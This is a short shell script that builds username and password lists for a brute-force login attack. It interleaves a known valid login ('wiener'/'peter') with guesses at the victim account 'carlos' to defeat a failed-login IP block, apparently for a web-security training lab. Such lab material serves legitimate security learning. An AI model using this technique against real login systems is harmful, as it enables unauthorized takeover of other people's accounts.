#!/bin/sh

# variable
true_usernm="wiener"
true_passwd="peter"
passwd_list="../password.lst"
victim="carlos"

# create username file cointains carlos for 100 times
printf $victim'\n%.0s' {1..100} |tee -a tmp1 > /dev/null

# generate username list for bruteforce (for carlos)
echo -e "\n$(cat tmp1)" > tmp2
cat tmp2 | awk '(++n==1) {print "wiener"; n=0} {print}' > tmp3
tail -n +3 tmp3 > username-brute.lst
rm tmp1 tmp2 tmp3


# generate password list for bruteforce
echo -e "\n$(cat $passwd_list)" > tmp1                          # add 2 empty lines add beginning of the file
cat tmp1 | awk '(++n==1) {print "peter"; n=0} {print}' > tmp2     # add peter (password) every 3rd line
tail -n +3 tmp2 > passwd-brute.lst                                # delete 2 empty lines added before
rm tmp1 tmp2                                                      # delete tmp fies
